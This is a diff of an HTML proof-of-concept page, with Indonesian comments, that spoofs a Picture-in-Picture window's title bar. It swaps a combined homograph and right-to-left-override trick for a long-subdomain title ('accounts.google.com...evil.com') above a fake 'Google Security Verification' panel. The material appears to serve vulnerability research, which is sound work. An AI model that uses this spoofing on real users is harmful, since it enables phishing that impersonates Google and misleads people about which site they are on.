@@ -11,7 +11,7 @@
 </head>
 <body>
 
-<h2>PiP Title Bar Spoofing (Combined)</h2>
+<h2>PiP Title Bar Spoofing (Long Subdomain)</h2>
 <p>Klik tombol di bawah. Perhatikan title bar PiP.</p>
 <button id="startBtn">Open Spoofed PiP</button>
 
@@ -34,21 +34,18 @@
       });
 
       // ============================================
-      // COMBINED SPOOFING
+      // SPOOFING TITLE BAR DENGAN SUBDOMAIN PANJANG
       // ============================================
-      // 1. Homograph: Cyrillic 'е' (U+0435)
-      // 2. RTLO: U+202E untuk membalik teks
-      // 3. Panjang subdomain: untuk menyembunyikan domain asli
+      // Domain asli: accounts.google.com.very-long-subdomain-to-hide-real-domain.evil.com
+      // Title bar mungkin terpotong, hanya menampilkan "accounts.google.com"
       
-      var spoofedTitle = "accounts.google.com \u202E moc.elgoog\u0435.stnuocca.very-long-subdomain-to-hide-real-domain.evil.com";
-      
-      pipWindow.document.title = spoofedTitle;
+      pipWindow.document.title = "accounts.google.com.very-long-subdomain-to-hide-real-domain.evil.com";
 
       pipWindow.document.body.innerHTML = `
         <div style="font-family:sans-serif;text-align:center;padding:20px;">
           <h3>Google Security Verification</h3>
-          <p>This PiP window is spoofing the title bar with combined techniques.</p>
-          <p style="color:#666;font-size:12px;">Check the title bar above.</p>
+          <p>This PiP window is spoofing the title bar with a long subdomain.</p>
+          <p style="color:#666;font-size:12px;">Check the title bar above (it may be truncated).</p>
         </div>
       `;
 
